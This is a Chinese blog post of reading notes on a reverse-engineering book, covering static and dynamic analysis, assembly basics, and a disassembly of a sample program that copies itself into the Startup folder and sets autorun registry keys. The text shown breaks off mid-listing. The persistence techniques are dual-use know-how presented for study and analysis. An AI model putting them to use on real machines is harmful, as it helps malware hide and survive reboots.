<!DOCTYPE html>
<html>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>有趣的二进制读书笔记</title>
    <meta name="description" content="在看有趣的二进制的时候，做了些笔记，对知识的扩充和积累。承蒙大佬们厚爱，投稿之后，竟然被发表了。谢谢@re4lity和xxxx表哥，还有mottoin">

    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
    <link rel="stylesheet" href="/css/main.css ">
    <link rel="canonical" href="http://localhost:4000/2017/04/06/interesting-bin/">
    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">


    <script>
    // 百度统计代码
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>


    <script>
    // google analytics
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-111240288-1', 'auto');
      ga('send', 'pageview');

    </script>



</head>


  <body>

    <header id="top">
    <div class="wrapper">
        <a href="/" class="brand">Jirairya</a>
        <small></small>
        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
        <nav id="headerNav">
            <ul>
                <li>
                    
                    <a href="/">
                    
                        <i class="fa fa-home"></i>Home
                    </a>
                </li>

                
                    
                    <li>
                        
                        <a href="/archive/">
                        
                            <i class="fa fa-archive"></i>Archives
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/category/">
                        
                            <i class="fa fa-th-list"></i>Categories
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tag/">
                        
                            <i class="fa fa-tags"></i>Tags
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/collections/">
                        
                            <i class="fa fa-folder-open"></i>Collections
                        </a>
                    </li>
                    
                
                    
                
                    
                    <li>
                        
                        <a href="/skills/">
                        
                            <i class="fa fa-bezier-curve"></i>Skills
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tools/">
                        
                            <i class="fa fa-toolbox"></i>Tools
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/about/">
                        
                            <i class="fa fa-paper-plane"></i>About
                        </a>
                    </li>
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
            </ul>
        </nav>
    </div>
</header>


        <div class="page clearfix" post>
    <div class="left">
        <h1>有趣的二进制读书笔记</h1>
        <div class="label">

            <div class="label-card">
                <i class="fa fa-calendar"></i>2017-04-06
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
            


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#sec" title="Category: sec" rel="category">sec</a>&nbsp;
    
        <a href="/category/#bin" title="Category: bin" rel="category">bin</a>&nbsp;
    
        <a href="/category/#paper" title="Category: paper" rel="category">paper</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


            </div>

            <div class="label-card">
            
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <!--a href="/tag/#bin" title="Tag: bin" rel="tag">bin</a-->
        <a href="/tag/#bin" title="Tag: bin" rel="tag">bin</a>&nbsp;
    
        <!--a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a-->
        <a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a>&nbsp;
    
        <!--a href="/tag/#reverse" title="Tag: reverse" rel="tag">reverse</a-->
        <a href="/tag/#reverse" title="Tag: reverse" rel="tag">reverse</a>
    
  

</span>

            </div>

        </div>
        <hr>
        <article itemscope itemtype="http://schema.org/BlogPosting">
        <p>在看有趣的二进制的时候，做了些笔记，对知识的扩充和积累。
承蒙大佬们厚爱，投稿之后，竟然被发表了。谢谢@<a href="http://weibo.com/u/5887314122">re4lity</a>和xxxx表哥，还有<a href="http://mottoin.com">mottoin</a></p>

<ul id="markdown-toc">
  <li><a href="#通过逆向学习汇编代码" id="markdown-toc-通过逆向学习汇编代码">通过逆向学习汇编代码</a>    <ul>
      <li><a href="#软件分析" id="markdown-toc-软件分析">软件分析</a></li>
      <li><a href="#尝试静态分析" id="markdown-toc-尝试静态分析">尝试静态分析</a></li>
      <li><a href="#动态分析" id="markdown-toc-动态分析">动态分析</a></li>
      <li><a href="#汇编指令" id="markdown-toc-汇编指令">汇编指令</a>        <ul>
          <li><a href="#汇编语言的条件分支" id="markdown-toc-汇编语言的条件分支">汇编语言的条件分支</a></li>
          <li><a href="#参数放在栈中" id="markdown-toc-参数放在栈中">参数放在栈中</a></li>
        </ul>
      </li>
      <li><a href="#通过汇编指令观察程序行为" id="markdown-toc-通过汇编指令观察程序行为">通过汇编指令观察程序行为</a></li>
    </ul>
  </li>
  <li><a href="#内存转储和反调试" id="markdown-toc-内存转储和反调试">内存转储和反调试</a>    <ul>
      <li><a href="#内存转储" id="markdown-toc-内存转储">内存转储</a>        <ul>
          <li><a href="#获取内存转储" id="markdown-toc-获取内存转储">获取内存转储</a></li>
          <li><a href="#有效运行实时调试" id="markdown-toc-有效运行实时调试">有效运行实时调试</a></li>
          <li><a href="#通过转储文件寻找出错原因" id="markdown-toc-通过转储文件寻找出错原因">通过转储文件寻找出错原因</a></li>
        </ul>
      </li>
      <li><a href="#防止软件被人分析" id="markdown-toc-防止软件被人分析">防止软件被人分析</a>        <ul>
          <li><a href="#反调试技术" id="markdown-toc-反调试技术">反调试技术</a>            <ul>
              <li><a href="#isdebuggerpresent" id="markdown-toc-isdebuggerpresent">IsDebuggerPresent</a></li>
              <li><a href="#通过代码混淆防止分析" id="markdown-toc-通过代码混淆防止分析">通过代码混淆防止分析</a></li>
              <li><a href="#将可执行文件压缩" id="markdown-toc-将可执行文件压缩">将可执行文件压缩</a></li>
              <li><a href="#将压缩过的文件解包" id="markdown-toc-将压缩过的文件解包">将压缩过的文件解包</a></li>
              <li><a href="#通过手动解包upx来理解工作原理" id="markdown-toc-通过手动解包upx来理解工作原理">通过手动解包UPX来理解工作原理</a></li>
              <li><a href="#用硬件断点对aspack进行解包" id="markdown-toc-用硬件断点对aspack进行解包">用硬件断点对ASPack进行解包</a></li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#利用软件漏洞进行攻击" id="markdown-toc-利用软件漏洞进行攻击">利用软件漏洞进行攻击</a>    <ul>
      <li><a href="#利用缓冲区漏洞溢出执行任意代码" id="markdown-toc-利用缓冲区漏洞溢出执行任意代码">利用缓冲区漏洞溢出执行任意代码</a>        <ul>
          <li><a href="#引发缓冲区溢出示例" id="markdown-toc-引发缓冲区溢出示例">引发缓冲区溢出示例</a></li>
          <li><a href="#让普通用户用管理员权限运行程序" id="markdown-toc-让普通用户用管理员权限运行程序">让普通用户用管理员权限运行程序</a></li>
          <li><a href="#权限如何被夺取" id="markdown-toc-权限如何被夺取">权限如何被夺取</a></li>
          <li><a href="#栈使用运行空间" id="markdown-toc-栈使用运行空间">栈使用运行空间</a></li>
          <li><a href="#执行任意代码" id="markdown-toc-执行任意代码">执行任意代码</a></li>
          <li><a href="#使用gdb查看程序运行情况" id="markdown-toc-使用gdb查看程序运行情况">使用gdb查看程序运行情况</a></li>
          <li><a href="#攻击代码示例" id="markdown-toc-攻击代码示例">攻击代码示例</a></li>
          <li><a href="#生成可用作shellcode的机器语言代码" id="markdown-toc-生成可用作shellcode的机器语言代码">生成可用作shellcode的机器语言代码</a></li>
          <li><a href="#对0x00的改进" id="markdown-toc-对0x00的改进">对0x00的改进</a></li>
        </ul>
      </li>
      <li><a href="#防御攻击的技术" id="markdown-toc-防御攻击的技术">防御攻击的技术</a>        <ul>
          <li><a href="#地址随机化aslr" id="markdown-toc-地址随机化aslr">地址随机化:ASLR</a></li>
          <li><a href="#exec-shield" id="markdown-toc-exec-shield">Exec-Shield</a></li>
          <li><a href="#stackguard" id="markdown-toc-stackguard">StackGuard</a></li>
        </ul>
      </li>
      <li><a href="#绕开安全机制" id="markdown-toc-绕开安全机制">绕开安全机制</a>        <ul>
          <li><a href="#return-into-libc" id="markdown-toc-return-into-libc">Return-into-libc</a></li>
          <li><a href="#rop" id="markdown-toc-rop">ROP</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#调试器和安全编程技巧" id="markdown-toc-调试器和安全编程技巧">调试器和安全编程技巧</a>    <ul>
      <li><a href="#调试器的工作原理" id="markdown-toc-调试器的工作原理">调试器的工作原理</a></li>
      <li><a href="#实现反汇编功能" id="markdown-toc-实现反汇编功能">实现反汇编功能</a></li>
    </ul>
  </li>
  <li><a href="#代码注入" id="markdown-toc-代码注入">代码注入</a>    <ul>
      <li><a href="#用setwindowshookex劫持系统消息" id="markdown-toc-用setwindowshookex劫持系统消息">用SetWindowsHookEx劫持系统消息</a></li>
      <li><a href="#将dll路径配置到注册表的applnit_dlls项" id="markdown-toc-将dll路径配置到注册表的applnit_dlls项">将DLL路径配置到注册表的AppLnit_DLLs项</a></li>
      <li><a href="#通过createremotethread在其他进程中创建线程" id="markdown-toc-通过createremotethread在其他进程中创建线程">通过CreateRemoteThread在其他进程中创建线程</a></li>
      <li><a href="#注入函数" id="markdown-toc-注入函数">注入函数</a></li>
    </ul>
  </li>
  <li><a href="#api钩子" id="markdown-toc-api钩子">API钩子</a>    <ul>
      <li><a href="#用detours实现一个简单的api钩子" id="markdown-toc-用detours实现一个简单的api钩子">用Detours实现一个简单的API钩子</a></li>
      <li><a href="#修改消息框的标题栏" id="markdown-toc-修改消息框的标题栏">修改消息框的标题栏</a></li>
    </ul>
  </li>
  <li><a href="#观察反rop机制" id="markdown-toc-观察反rop机制">观察反ROP机制</a>    <ul>
      <li><a href="#ropguard" id="markdown-toc-ropguard">ROPGuard</a></li>
    </ul>
  </li>
  <li><a href="#分析恶意软件" id="markdown-toc-分析恶意软件">分析恶意软件</a></li>
</ul>

<!--more-->

<h2 id="通过逆向学习汇编代码">通过逆向学习汇编代码</h2>

<h3 id="软件分析">软件分析</h3>
<ul>
  <li>文件的创建、修改、删除</li>
  <li>注册表项目的创建、修改和删除</li>
  <li>网络通信</li>
</ul>

<p>hex比较文件内容：
<img src="/img/interestingBin/1476837859289.png" alt="Alt text" /></p>

<p>Windos程序在重启的时候，可以把自动运行的程序注册在以下注册表中：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">HKEY_LOCAL_MACHINE</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Run</span>
 <span class="n">HKEY_CURRENT_USER</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Run</span>
 <span class="n">HKEY_LOCAL_MACHINE</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">RunOnce</span>
 <span class="n">HKEY_CURRENT_USER</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">RunOnce</span>
</code></pre></div></div>

<p>sample.exe执行了：</p>
<ul>
  <li>修改注册表以便系统重启的时候自动运行</li>
  <li>将自己复制到“启动”文件夹以便在系统启动时自动运行</li>
</ul>

<h3 id="尝试静态分析">尝试静态分析</h3>
<p>软件分析，从方法可以分为“静态方法”和“动态方法”，它们的区别如下：</p>

<ul>
  <li>
    <p>静态分析：在不运行目标的情况下分析</p>

    <ul>
      <li>阅读反汇编代码</li>
      <li>提取可执行文件中的字符串，分析使用了哪些单词</li>
    </ul>
  </li>
</ul>

<blockquote>
  <p>从广义上来看，使用二进制编辑器查看可执行文件的内容也是静态分析</p>
</blockquote>

<p><strong>PE文件：</strong>
PE就是Portable Executable（可移植可执行），它是Win32可执行文件的标准格式。PE文件是跨Win32平台的，即使Windows运行在非Intel的CPU上，任何Win32平台的PE装载器都能识别和使用该文件格式但移植到不同的CPU上会PE文件执行文件必然会改变。所有Win32执行体（除了VxD和16位的Dll）都使用PE文件，包括NT内核模式的驱动程序。</p>

<p>Win32病毒运行：</p>
<blockquote>
  <p>有些在HOST运行过程中调用病毒代码</p>
</blockquote>

<ul>
  <li>用户点击（或者系统自动运行）HOST程序</li>
  <li>装载HOST程序到内存</li>
  <li>通过PE文件中的AddressOfEntryPoint和ImageBase之和来定位第一条语句的位置</li>
  <li>从第一条语句开始执行（此时执行的就是病毒代码）</li>
  <li>病毒主体代码执行完毕，将控制权交给HOST程序原来入口代码</li>
  <li>HOST程序继续执行</li>
</ul>

<p><img src="/img/interestingBin/1477316082696.png" alt="Alt text" /></p>

<p><img src="/img/interestingBin/1477316128958.png" alt="Alt text" /></p>

<p><img src="/img/interestingBin/1477316142493.png" alt="Alt text" /></p>

<h3 id="动态分析">动态分析</h3>

<ul>
  <li>用调试器跟踪程序逻辑</li>
  <li>获取文件和注册表访问日志</li>
  <li>获取网络包</li>
</ul>

<p><img src="/img/interestingBin/1477318942832.png" alt="Alt text" /></p>

<blockquote>
  <p>“当进程名称为wsample01b.exe时输出日志”</p>
</blockquote>

<p><strong>调试器</strong>：发现程序问题和bug的软件，一般具有以下功能：</p>
<ul>
  <li>断点</li>
  <li>单步跳入、跳出</li>
  <li>查看寄存器和内存数据</li>
</ul>

<p>断点是能够让程序在任意位置中断、恢复运行的功能。可以在可能会发生bug的地方稍微往前一点设置一个断点，以便找到导致问题的程序逻辑。一般来说，如果是机器语言，则以指令为单位来设置断点；如果是高级语言，则以源代码的行为单位来设置断点。断点能够在任意位置中断和恢复运行，而每执行一条指令都中断一次叫做单步跳入或跳出。通过单步运行的功能，我们可以以一条指令或一行代码为单位逐个运行程序的逻辑，仔细确认内存和变量的状态。跳入跳出的区别：</p>

<ul>
  <li><strong>跳入：调用函数时进入函数内部</strong></li>
  <li><strong>跳出：调用函数时不进入函数内部，而是将函数调用作为一条指令来执行</strong>
最后就是查看寄存器和内存数据了，这个功能可以再程序中断运行的状态下确认寄存器、内存和变量的状态。</li>
</ul>

<p><img src="/img/interestingBin/1478437148946.png" alt="Alt text" /></p>

<p>F2下断点，F7单步跳入，F8单步跳出。</p>

<p>寄存器是位于CPU的内部存储空间，都有自己的名字：</p>

<ul>
  <li>EAX，”累加器”(accumulator)，扩展累加寄存器，在乘法和除法中被自动使用</li>
  <li>EBX，”基地址”(base)寄存器, 在内存寻址时存放基地址。</li>
  <li>ECX，计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。</li>
  <li>EDX，则总是被用来放整数除法产生的余数。</li>
  <li>ESP，扩展堆栈指针寄存器，寻址堆栈，极少用于普通的算术运算和数据传送。</li>
  <li>ESI和EDI由高速内存数据传送指令使用，通常称为扩展源指针和扩展目的指针寄存器。</li>
  <li>EBP，扩展帧指针寄存器，高级语言使用EBP引用堆栈上的函数参数和局部变量。</li>
  <li>EIP，指令指针，存放下一条要执行的指令的地址。（指向当前执行的指令）有些程序可以修改EIP，使程序分支转移到新的地址执行。</li>
</ul>

<p><img src="/img/interestingBin/1478442124536.png" alt="Alt text" /></p>

<p>在EIP下有C、P、A、Z、S、T、D、O几个字母，它们表示标志。一般会在这些字母后加上F（FLAG），CF、PF、AF、ZF，这些标志表示用于条件分支，如：</p>

<ul>
  <li>若ZF为1表示跳转</li>
  <li>若CF位1表示不跳转</li>
</ul>

<blockquote>
  <p>EFLAGS 寄存器由控制CPU的操作或反映CPU某些运算的结果的独立二进制位构成。当某标志等于1时就说其被置位；等于0时候就说其被清除（或复位）</p>

  <p>控制标志，控制CPU的操作。例如，某些标志位可以使CPU在每条指令执行后、检测到算术运算溢出后、进入虚拟8086模式或保护模式后中断。</p>

  <p>状态标志，反映CPU执行的算术和逻辑运算的结果，包括溢出标志、符号标志、零标志、辅助进位标志、奇偶标志、进位标志：</p>
  <ul>
    <li>进位标志(CF):在无符号算术的运算结果太大而目的操作数无法容纳时置位</li>
    <li>溢出标志(OF):在有符号算术运算结果太大或太小而无目的操作数无法容纳时置位</li>
    <li>符号标志(SF):在算术或逻辑运算的结果位负时置位。</li>
    <li>零标志(ZF):在算术或逻辑运算结果为零时置位。</li>
    <li>辅助进位标志(AC):在算术运算导致8位操作数的位3到位4产生进位时置位。</li>
    <li>奇偶标志(PF):结果最低有效字节为1的位的数目位偶数时置位，否则PF复位。通常用于在数据有可能改变或丢失的情况下检查错误。</li>
  </ul>
</blockquote>

<p>静态分析和动态分析的区别是在于“是否运行程序”，静态偏向于“纵览全局”，动态分析偏向于“细看局部”。在软件分析的时候，首先用二进制编辑器和IDA看全局，然后再用OllyDbug看局部。</p>

<blockquote>
  <p>OD对python亲和性高，WinDbg对堆内核领域的程序进行调试，分析rootkit还是离不开它。</p>
</blockquote>

<h3 id="汇编指令">汇编指令</h3>

<p><img src="/img/interestingBin/1478526772119.png" alt="Alt text" /></p>

<h4 id="汇编语言的条件分支">汇编语言的条件分支</h4>

<p>汇编语言通过控制标志的cmp、test指令，以及根据标志完成分支的跳转类指令来实现。</p>

<p><img src="/img/interestingBin/1488938985975.png" alt="Alt text" /></p>

<blockquote>
  <p><code class="highlighter-rouge">test eax eax</code>，当eax为0时将ZF置为1.只要看到带有两个相同寄存器的test指令，一般就是条件分支，可以理解为“若寄存器值为0，则将ZF置为1”
jnz指令的意思是，当ZF不为0时跳转。因此，将jnz和test指令结合起来就实现了</p>
  <ul>
    <li>若eax为0则不跳转</li>
    <li>若eax为1则跳转</li>
  </ul>

  <p>eax为0040100c的call lstrcmpW的返回值</p>
</blockquote>

<p>当ZF为1时程序不会进行跳转，而是继续执行0040101D的指令，从而显示”Hello!2012”这条消息。</p>

<h4 id="参数放在栈中">参数放在栈中</h4>

<p>参数通过栈来传递。</p>

<p><code class="highlighter-rouge">call</code>指令用来调用子程序，返回值放在eax中。传递给子程序的参数通过<code class="highlighter-rouge">push</code>放在栈中。</p>

<p>C语言中的函数调用：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">function</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>
</code></pre></div></div>

<p>汇编语言中的函数调用：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">push</span> <span class="mi">3</span>
<span class="n">push</span> <span class="mi">2</span>
<span class="n">push</span> <span class="mi">1</span>
<span class="n">call</span> <span class="n">function</span>
</code></pre></div></div>
<blockquote>
  <p>参数是从后往前入栈。但也会因为CPU和编译器的不同有所变化。</p>
</blockquote>

<p>例如00401006位置上代码如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mo">00401006</span> <span class="n">push</span> <span class="n">offet</span> <span class="n">String2</span> <span class="p">;</span> <span class="s">"2012"</span>
<span class="mo">0040100</span><span class="n">B</span> <span class="n">push</span> <span class="n">eax</span>           <span class="p">;</span> <span class="n">lpString1</span>
<span class="mo">0040100</span><span class="n">C</span> <span class="n">call</span> <span class="n">ds</span><span class="o">:</span><span class="n">__imp__lstrcmpW</span><span class="err">@</span><span class="mi">8</span> <span class="p">;</span><span class="n">lstrcmpW</span><span class="p">(</span><span class="n">X</span><span class="p">,</span><span class="n">X</span><span class="p">)</span>
</code></pre></div></div>

<p>由于参数入栈顺序，可改成<code class="highlighter-rouge">eax=lstrcmpW(eax,"2012")</code>。<code class="highlighter-rouge">lstrcmpW</code>函数的功能是，当参数中的两个字符串相同时，则返回0，否则返回非0.</p>

<h3 id="通过汇编指令观察程序行为">通过汇编指令观察程序行为</h3>

<p>使用OD打开样本程序，然后在反汇编窗口中，右键选择Search for -&gt;Name in all modules
<img src="/img/interestingBin/1488943666940.png" alt="Alt text" />
从显示的的函数列表中，找到类型为Export的<code class="highlighter-rouge">RegSetValueExa</code>函数：
<img src="/img/interestingBin/1488945439284.png" alt="Alt text" />
双击函数名，跳转到该函数的开头。
在Export类型的函数上，双击并设置断点。
按F9运行样本文件，程序会在断点处暂停运行。
按Ctrl+F9(运行至Return处)或者按Alt+F9(运行到用户代码处)，程序会继续运行到函数返回的地方。
<img src="/img/interestingBin/1488947599525.png" alt="Alt text" /></p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">C2</span>                 <span class="k">push</span>    <span class="mi">400</span><span class="n">h</span>            <span class="c">; nSize</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">C7</span>                 <span class="k">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">85</span><span class="n">Ch</span><span class="o">+</span><span class="n">Filename</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">CE</span>                 <span class="k">push</span>    <span class="n">eax</span>             <span class="c">; lpFilename</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">CF</span>                 <span class="k">push</span>    <span class="n">ecx</span>             <span class="c">; hModule</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">D0</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">GetModuleFileNameA</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">D6</span>                 <span class="k">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">SHGetSpecialFolderPathA</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">DC</span>                 <span class="k">push</span>    <span class="mi">0</span>               <span class="c">; fCreate</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">DE</span>                 <span class="k">push</span>    <span class="mi">7</span>               <span class="c">; csidl</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">E0</span>                 <span class="k">lea</span>     <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">860</span><span class="n">h</span><span class="o">+</span><span class="n">pszPath</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">E4</span>                 <span class="k">push</span>    <span class="n">ecx</span>             <span class="c">; pszPath</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">E5</span>                 <span class="k">push</span>    <span class="mi">0</span>               <span class="c">; hwnd</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">E7</span>                 <span class="k">call</span>    <span class="n">esi</span> <span class="c">; SHGetSpecialFolderPathA</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">E9</span>                 <span class="k">mov</span>     <span class="n">edi</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">lstrcatA</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">EF</span>                 <span class="k">push</span>    <span class="n">offset</span> <span class="n">String2</span>  <span class="c">; "\\0.exe"</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">F4</span>                 <span class="k">lea</span>     <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">85</span><span class="n">Ch</span><span class="o">+</span><span class="n">pszPath</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">F8</span>                 <span class="k">push</span>    <span class="n">edx</span>             <span class="c">; lpString1</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">F9</span>                 <span class="k">call</span>    <span class="n">edi</span> <span class="c">; lstrcatA</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004013</span><span class="n">FB</span>                 <span class="k">mov</span>     <span class="n">ebx</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">CopyFileA</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401401</span>                 <span class="k">push</span>    <span class="mi">0</span>               <span class="c">; bFailIfExists</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401403</span>                 <span class="k">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">85</span><span class="n">Ch</span><span class="o">+</span><span class="n">pszPath</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401407</span>                 <span class="k">push</span>    <span class="n">eax</span>             <span class="c">; lpNewFileName</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401408</span>                 <span class="k">lea</span>     <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">860</span><span class="n">h</span><span class="o">+</span><span class="n">Filename</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040140</span><span class="n">F</span>                 <span class="k">push</span>    <span class="n">ecx</span>             <span class="c">; lpExistingFileName</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401410</span>                 <span class="k">call</span>    <span class="n">ebx</span> <span class="c">; CopyFileA</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401412</span>                 <span class="k">push</span>    <span class="mi">0</span>               <span class="c">; fCreate</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401414</span>                 <span class="k">push</span>    <span class="mi">5</span>               <span class="c">; csidl</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401416</span>                 <span class="k">lea</span>     <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">860</span><span class="n">h</span><span class="o">+</span><span class="n">pszPath</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040141</span><span class="n">A</span>                 <span class="k">push</span>    <span class="n">edx</span>             <span class="c">; pszPath</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040141</span><span class="n">B</span>                 <span class="k">push</span>    <span class="mi">0</span>               <span class="c">; hwnd</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040141</span><span class="n">D</span>                 <span class="k">call</span>    <span class="n">esi</span> <span class="c">; SHGetSpecialFolderPathA</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040141</span><span class="n">F</span>                 <span class="k">push</span>    <span class="n">offset</span> <span class="n">a1_exe</span>   <span class="c">; "\\1.exe"</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401424</span>                 <span class="k">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">85</span><span class="n">Ch</span><span class="o">+</span><span class="n">pszPath</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401428</span>                 <span class="k">push</span>    <span class="n">eax</span>             <span class="c">; lpString1</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401429</span>                 <span class="k">call</span>    <span class="n">edi</span> <span class="c">; lstrcatA</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040142</span><span class="n">B</span>                 <span class="k">push</span>    <span class="mi">0</span>               <span class="c">; bFailIfExists</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040142</span><span class="n">D</span>                 <span class="k">lea</span>     <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">85</span><span class="n">Ch</span><span class="o">+</span><span class="n">pszPath</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401431</span>                 <span class="k">push</span>    <span class="n">ecx</span>             <span class="c">; lpNewFileName</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401432</span>                 <span class="k">lea</span>     <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">860</span><span class="n">h</span><span class="o">+</span><span class="n">Filename</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401439</span>                 <span class="k">push</span>    <span class="n">edx</span>             <span class="c">; lpExistingFileName</span>
